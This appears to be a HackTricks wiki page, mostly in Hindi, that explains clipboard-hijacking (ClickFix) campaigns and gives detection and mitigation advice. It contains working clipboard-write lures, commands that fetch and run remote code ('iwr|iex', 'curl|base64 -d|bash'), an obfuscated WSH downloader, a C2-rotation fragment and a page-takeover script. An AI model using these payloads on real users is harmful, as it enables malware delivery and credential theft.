# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "कभी भी वह न पेस्ट करें जो आपने स्वयं कॉपी न किया हो।" – पुरानी परंतु अब भी प्रासंगिक सलाह

## अवलोकन

Clipboard hijacking – जिसे *pastejacking* भी कहा जाता है – इस तथ्य का दुरुपयोग करता है कि उपयोगकर्ता सामान्यतः कमांड्स को बिना जाँच किए copy-and-paste कर लेते हैं। एक दुर्भावनापूर्ण वेब पेज (या कोई भी JavaScript-सक्षम context जैसे Electron या Desktop application) प्रोग्रामेटिकली हमलावर-नियंत्रित टेक्स्ट को सिस्टम क्लिपबोर्ड में डाल देता है। पीड़ितों को अक्सर सावधानीपूर्वक बनाए गए social-engineering निर्देशों के माध्यम से प्रेरित किया जाता है कि वे **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) दबाएँ, या एक terminal खोलें और क्लिपबोर्ड सामग्री को *paste* करें, जिससे तुरंत मनमाने कमांड निष्पादित हो जाते हैं।

क्योंकि **कोई फ़ाइल डाउनलोड नहीं की जाती और कोई attachment नहीं खोला जाता**, यह तकनीक उन अधिकांश ई-mail और वेब-कंटेंट सुरक्षा नियंत्रणों को बायपास कर देती है जो attachments, macros या direct command execution की निगरानी करते हैं। इसलिए यह हमला उन phishing अभियानों में लोकप्रिय है जो NetSupport RAT, Latrodectus loader या Lumma Stealer जैसी commodity malware families वितरित करते हैं।

## JavaScript प्रूफ़-ऑफ़-कॉन्सेप्ट
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older अभियानों ने `document.execCommand('copy')` का उपयोग किया, नई कंपनियाँ asynchronous **Clipboard API** (`navigator.clipboard.writeText`) पर निर्भर करती हैं।

## The ClickFix / ClearFake Flow

1. उपयोगकर्ता किसी typosquatted या compromised साइट पर जाता है (उदा. `docusign.sa[.]com`)
2. Injected **ClearFake** JavaScript एक `unsecuredCopyToClipboard()` helper को कॉल करता है जो चुपचाप clipboard में एक Base64-encoded PowerShell one-liner स्टोर कर देता है।
3. HTML निर्देश पीड़ित को बताते हैं: *“Press **Win + R**, कमांड पेस्ट करें और समस्या हल करने के लिए Enter दबाएँ.”*
4. `powershell.exe` चलता है, एक archive डाउनलोड करता है जिसमें एक legitimate executable और एक malicious DLL होता है (classic DLL sideloading)।
5. Loader अतिरिक्त stages को decrypt करता है, shellcode inject करता है और persistence स्थापित करता है (उदा. scheduled task) – अंततः NetSupport RAT / Latrodectus / Lumma Stealer को चलाता है।

### NetSupport RAT चेन का उदाहरण
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (वैध Java WebStart) अपनी डायरेक्टरी में `msvcp140.dll` की तलाश करता है।
* दुर्भावनापूर्ण DLL **GetProcAddress** के साथ APIs को डायनामिक रूप से resolve करता है, **curl.exe** के माध्यम से दो बाइनरी (`data_3.bin`, `data_4.bin`) डाउनलोड करता है, उन्हें rolling XOR key `"https://google.com/"` का उपयोग करके डिक्रिप्ट करता है, अंतिम shellcode को inject करता है और **client32.exe** (NetSupport RAT) को `C:\ProgramData\SecurityCheck_v1\` में अनज़िप करता है।

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe** के साथ `la.txt` डाउनलोड करता है
2. **cscript.exe** के अंदर JScript downloader को निष्पादित करता है
3. एक MSI payload प्राप्त करता है → signed application के पास `libcef.dll` गिराता है → DLL sideloading → shellcode → Latrodectus

### Lumma Stealer के माध्यम से MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** कॉल एक छिपी हुई PowerShell स्क्रिप्ट लॉन्च करती है जो `PartyContinued.exe` को प्राप्त करती है, `Boat.pst` (CAB) को निकालती है, `extrac32` और फ़ाइल concatenation के माध्यम से `AutoIt3.exe` का पुनर्निर्माण करती है और अंत में एक `.a3x` स्क्रिप्ट चलाती है जो ब्राउज़र क्रेडेंशियल्स को `sumeriavgv.digital` पर exfiltrate करती है।

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

कुछ ClickFix campaigns फ़ाइल डाउनलोड पूरी तरह छोड़ देते हैं और पीड़ितों को एक one‑liner पेस्ट करने का निर्देश देते हैं जो WSH के माध्यम से JavaScript को fetch और execute करता है, इसे persist करता है, और C2 को दैनिक रूप से rotate करता है। उदाहरण के रूप में देखी गई श्रृंखला:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
मुख्य विशेषताएँ
- Obfuscated URL को runtime पर उल्टा किया जाता है ताकि साधारण निरीक्षण विफल रहे।
- JavaScript अपने आप को Startup LNK (WScript/CScript) के माध्यम से स्थायी बनाता है, और वर्तमान दिन के आधार पर C2 चुनता है – तेज़ domain rotation को सक्षम करता है।

C2s को तारीख के अनुसार घुमाने के लिए प्रयुक्त न्यूनतम JS fragment:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
अगला स्टेज आमतौर पर एक loader तैनात करता है जो persistence स्थापित करता है और एक RAT (उदा., PureHVNC) खींचता है, अक्सर TLS को एक hardcoded certificate पर pin करते हुए और ट्रैफ़िक को chunk करता है।

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- रोज़-रोटेट होने वाले C2 hostnames और URLs जिनमें `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` पैटर्न होता है।
- clipboard write इवेंट्स को correlate करें जिनके बाद Win+R paste और तत्क्षण `powershell.exe` execution होता है।

Blue-teams clipboard, process-creation और registry telemetry को combine करके pastejacking दुरुपयोग को pinpoint कर सकते हैं:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` Win + R कमांड्स का इतिहास रखता है – असामान्य Base64 / obfuscated एंट्रीज़ देखें।
* Security Event ID **4688** (Process Creation) जहाँ `ParentImage` == `explorer.exe` और `NewProcessName` { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } में है।
* Event ID **4663** उन फ़ाइल निर्माणों के लिए जो `%LocalAppData%\Microsoft\Windows\WinX\` या temporary folders के अंतर्गत suspicious 4688 इवेंट से ठीक पहले होते हैं।
* EDR clipboard sensors (यदि मौजूद हों) – `Clipboard Write` को तुरंत एक नए PowerShell process से correlate करें।

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

हालिया कैंपेन बड़े पैमाने पर नकली CDN/browser सत्यापन पृष्ठ ("Just a moment…", IUAM-style) बनाते हैं जो users को उनके clipboard से OS-specific commands को native consoles में copy करने के लिए मजबूर करते हैं। यह ब्राउज़र sandbox से execution को pivot करता है और Windows तथा macOS दोनों पर काम करता है।

बिल्डर-जनित पृष्ठों की प्रमुख विशेषताएँ
- `navigator.userAgent` के माध्यम से OS detection, payloads को tailor करने के लिए (Windows PowerShell/CMD बनाम macOS Terminal)। असमर्थित OS के लिए वैकल्पिक decoys/no-ops illusion बनाए रखने हेतु।
- सरल UI क्रियाओं (checkbox/Copy) पर Automatic clipboard-copy, जबकि दिखाई देने वाला टेक्स्ट clipboard content से भिन्न हो सकता है।
- Mobile blocking और एक popover जिसमें चरण-दर-चरण निर्देश हैं: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter।
- वैकल्पिक obfuscation और single-file injector जो किसी compromised साइट के DOM को Tailwind-styled verification UI से overwrite कर देता है (नई domain registration की आवश्यकता नहीं)।

उदाहरण: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS पर प्रारम्भिक रन की persistence
- प्रयोग करें `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ताकि निष्पादन टर्मिनल बंद होने के बाद भी जारी रहे, दृश्य अवशेष कम हों।

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
IUAM-style lures के लिए विशिष्ट Detection और hunting विचार

- Web: पेज जो Clipboard API को verification widgets से बाँधते हैं; displayed text और clipboard payload के बीच mismatch; `navigator.userAgent` branching; Tailwind + single-page replace संदिग्ध संदर्भों में।
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` ब्राउज़र interaction के थोड़ी देर बाद; batch/MSI installers `%TEMP%` से executed।
- macOS endpoint: Terminal/iTerm द्वारा `bash`/`curl`/`base64 -d` को `nohup` के साथ spawn करना ब्राउज़र events के निकट; terminal बंद होने पर background jobs का जीवित रहना।
- `RunMRU` Win+R history और clipboard writes को subsequent console process creation के साथ correlate करें।

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## निवारण

1. Browser hardening – clipboard write-access (`dom.events.asyncClipboard.clipboardItem` आदि) को अक्षम करें या user gesture की आवश्यकता रखें।
2. Security awareness – उपयोगकर्ताओं को संवेदनशील कमांड्स को *टाइप* करने या पहले किसी टेक्स्ट एडिटर में पेस्ट करने के लिए सिखाएं।
3. PowerShell Constrained Language Mode / Execution Policy + Application Control का उपयोग arbitrary one-liners को ब्लॉक करने के लिए।
4. Network controls – ज्ञात pastejacking और malware C2 domains के लिए outbound requests को ब्लॉक करें।

## संबंधित तरकीबें

* **Discord Invite Hijacking** अक्सर उपयोग करता है वही ClickFix तरीका जब उपयोगकर्ताओं को malicious server में लुभाया जाता है:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## संदर्भ

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
